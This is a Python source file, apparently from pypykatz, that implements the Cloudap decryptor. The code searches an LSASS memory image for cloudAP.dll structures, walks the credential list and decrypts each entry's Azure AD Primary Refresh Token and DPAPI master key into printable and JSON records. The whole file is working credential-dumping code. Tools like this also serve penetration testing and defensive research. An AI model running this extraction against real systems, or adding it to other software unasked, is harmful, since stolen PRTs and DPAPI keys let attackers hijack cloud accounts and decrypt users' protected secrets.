import json
import hashlib
from pypykatz.lsadecryptor.package_commons import PackageDecryptor

class CloudapCredential:
	def __init__(self):
		self.credtype = 'cloudap'
		self.luid = None
		self.sid = None
		self.cachedir = None
		self.PRT = None
		self.key_guid = None
		self.dpapi_key = None
		self.dpapi_key_sha1 = None
	
	def to_dict(self):
		t = {}
		t['credtype'] = self.credtype
		t['cachedir'] = self.cachedir
		t['PRT'] = self.PRT
		t['key_guid'] = self.key_guid
		t['dpapi_key'] = self.dpapi_key
		t['dpapi_key_sha1'] = self.dpapi_key_sha1
		return t
		
	def to_json(self):
		return json.dumps(self.to_dict())
		
	def __str__(self):
		t = '\t== Cloudap [%x]==\n' % self.luid
		t += '\t\tcachedir %s\n' % self.cachedir
		t += '\t\tPRT %s\n' % self.PRT
		t += '\t\tkey_guid %s\n' % self.key_guid
		t += '\t\tdpapi_key %s\n' % self.dpapi_key
		t += '\t\tdpapi_key_sha1 %s\n' % self.dpapi_key_sha1
		return t

class CloudapDecryptor(PackageDecryptor):
	def __init__(self, reader, decryptor_template, lsa_decryptor, sysinfo):
		super().__init__('Cloudap', lsa_decryptor, sysinfo, reader)
		self.decryptor_template = decryptor_template
		self.credentials = []

	def find_first_entry(self):
		position = self.find_signature('cloudAP.dll',self.decryptor_template.signature)
		ptr_entry_loc = self.reader.get_ptr_with_offset(position + self.decryptor_template.first_entry_offset)
		ptr_entry = self.reader.get_ptr(ptr_entry_loc)
		return ptr_entry, ptr_entry_loc

	def add_entry(self, cloudap_entry):
		cred = CloudapCredential()
		cred.luid = cloudap_entry.LocallyUniqueIdentifier

		cache = cloudap_entry.cacheEntry.read(self.reader)
		cred.cachedir = cache.toname.decode('utf-16-le').replace('\x00','')
		if cache.cbPRT != 0 and cache.PRT.value != 0:
			temp = self.decrypt_password(cache.PRT.read_raw(self.reader, cache.cbPRT), bytes_expected=True)
			try:
				temp = temp.decode()
			except:
				pass
			
			cred.PRT = temp
			
		if cache.toDetermine != 0:
			unk = cache.toDetermine.read(self.reader)
			if unk is not None:
				cred.key_guid = unk.guid.value
				cred.dpapi_key = self.decrypt_password(unk.unk)
				cred.dpapi_key_sha1 = hashlib.sha1(bytes.fromhex(cred.dpapi_key)).hexdigest()

		if cred.PRT is None and cred.key_guid is None:
			return
		self.credentials.append(cred)
	
	def start(self):
		try:
			entry_ptr_value, entry_ptr_loc = self.find_first_entry()
		except Exception as e:
			self.log('Failed to find structs! Reason: %s' % e)
			return
		
		self.reader.move(entry_ptr_loc)
		entry_ptr = self.decryptor_template.list_entry(self.reader)
		self.walk_list(entry_ptr, self.add_entry)